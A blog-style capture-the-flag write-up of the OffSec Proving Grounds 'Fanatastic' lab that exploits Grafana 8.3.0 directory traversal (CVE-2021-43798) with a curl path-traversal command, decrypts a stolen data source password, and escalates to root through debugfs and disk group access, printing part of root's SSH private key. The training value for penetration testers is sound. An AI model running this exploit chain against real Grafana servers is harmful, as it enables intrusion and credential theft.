---
title: "Proving grounds Practice: Fanatastic"
layout: post
date: 2023-10-03 01:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- Grafana
- LFI
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1994b952225ed0f8520d363b448bbcf (RSA)
|   256 0f448badad95b8226af036ac19d00ef3 (ECDSA)
|_  256 32e12a6ccc7ce63e23f4808d33ce9b3a (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 03 Oct 2023 14:48:53 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
```

## PORT: 3000 - open

Grafana login page: http://192.168.194.181:3000/login

Grafana version - v8.3.0 is vulnerable to [Grafana 8.3.0 - Directory Traversal and Arbitrary File Read](https://www.exploit-db.com/exploits/50581). Run the exploit to read the local files.

Read `/etc/passwd` to know about the users in the system, `/etc/grafana/grafana.ini` to extract the secret that's been used to encrypt the grafana password. Finally, read `/var/lib/grafana/grafana.db` which contains the encrypted data source password.

User below curl command to download the `grafana.db` file.

```sh
naveenj@hackerspace:|11:12|~/proving_grounds/Fanatastic/files$ curl  --path-as-is http://192.168.194.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -O grafana.db
```

Open the file in sqlite and click Browse Data select the `data_source` tab and copy the basic auth detials.

```text
secret_key = SW2YcwTIb9zpOOhoPsMm
basicAuthPassword = anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
```

Exploit to decrypt the password [CVE-2021-43798](https://github.com/jas502n/Grafana-CVE-2021-43798). Make changes to the code accordingly and run it.

```sh
naveenj@hackerspace:|11:19|~/proving_grounds/Fanatastic/files/Grafana-CVE-2021-43798$ go run AESDecrypt.go 
[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
[*] DataSourcePassword= anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
[*] plainText= SuperSecureP@ssw0rd


[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
[*] PlainText= jas502n
[*] EncodePassword= NDAyQzFWQURLMIs9DT7F3U/R56XpIjb4tPONCv10Og==
naveenj@hackerspace:|11:19|~/proving_grounds/Fanatastic/files/Grafana-CVE-2021-43798$
```

**Credentials**: `sysadmin:SuperSecureP@ssw0rd`

The username was found in the `/etc/passwd` file. SSH to the machine using the credentials to obtain initial foothold.


## Privilege Escalation

Upon checking for exploitation the user `sysadmin` has permission to the disk.

```sh
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
```

Knowing the user is part of the disk group, the enumeration of the entire disk with root privilege is achievable. We also have full read-write access to the disk block files, so we can extricate these or write arbitrary data to them. With the disk group, we are effectively root, just in a roundabout way. We will explore the partition where the `/` (root) directory is mounted on in this case `/dev/sda2`.

```sh
sadmin@fanatastic:~$ df -h      #check for mounted disks
Filesystem      Size  Used Avail Use% Mounted on
udev            445M     0  445M   0% /dev
tmpfs            98M  1.1M   97M   2% /run
/dev/sda2       9.8G  5.7G  3.7G  61% /         #expoitable
tmpfs           489M     0  489M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           489M     0  489M   0% /sys/fs/cgroup
/dev/loop0       71M   71M     0 100% /snap/lxd/21029
/dev/loop1       56M   56M     0 100% /snap/core18/2284
/dev/loop2       62M   62M     0 100% /snap/core20/1328
/dev/loop3       68M   68M     0 100% /snap/lxd/21835
/dev/loop4       56M   56M     0 100% /snap/core18/2128
/dev/loop5       33M   33M     0 100% /snap/snapd/12883
/dev/loop6       44M   44M     0 100% /snap/snapd/14549
tmpfs            98M     0   98M   0% /run/user/1001
```

### Exploitation

```sh
sysadmin@fanatastic:~$ debugfs /dev/sda2
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cd /root
debugfs:  cat proof.txt
1583█████████████████████████
debugfs:
```

In order to get a root shell read the `id_rsa` key file located on `/root/.ssh/` folder and SSH to the root user.

```sh
ebugfs:  cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAz1L/rbeJcJOc5T4Lppdp0oVnX0MgpfaBjW25My3ffAeJTeJwM1/R
YGtnByjnBAisdAsqctvGjZL6TewN4QNM0ew5qD2BQUU38bvq1lRdvbaD1m+WZkhp6DJrbi
42MKCUeTMY5AEPBPe4kHBN294BiUycmtLzQz5gJ99AUSQa59m6QJso4YlC7OCs7xkDAxSJ
pE56z1yaiY+y4l2akIxbAz7TVmJgRnhjJ4ZRuV2TYuSolJiSNeUyIUTozfRKl56Zs8f/QA
4Pd9AvSLZPN+s/INAULdxzgV3X9xHYh2NfRe8hw1Ju9OeJZ9lqQNBtFrit0ekpk75CJ2Z6
AMDV5tNlEcixwf/nMhjQb7Q/Oh4p7ievBk47f5t2dKlTsWw4iq1AX3FVA65n2TfD6cNISj
mxfQvXzMTPrs8KO7pHzMVQZZukOIwOEKwuZfNxIg4riGQvy4Cs+3c4w022UJ8oH36itgjr
pa4Ce+uRomYgRthDLaTNmk52TbZl0pg8AdDXB0SbAAAFgCd1RWkndUVpAAAAB3NzaC1yc2
.....
```

**Root Obtained**

```sh
naveenj@hackerspace:|21:58|~/proving_grounds/Fanatastic/files$ chmod 600 id_rsa #apply permission
nveenj@hackerspace:|21:59|~/proving_grounds/Fanatastic/files$ ssh root@192.168.192.181 -i id_rsa #ssh to root
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)
The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Mar  1 18:46:45 2022
root@fanatastic:~# 
```

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).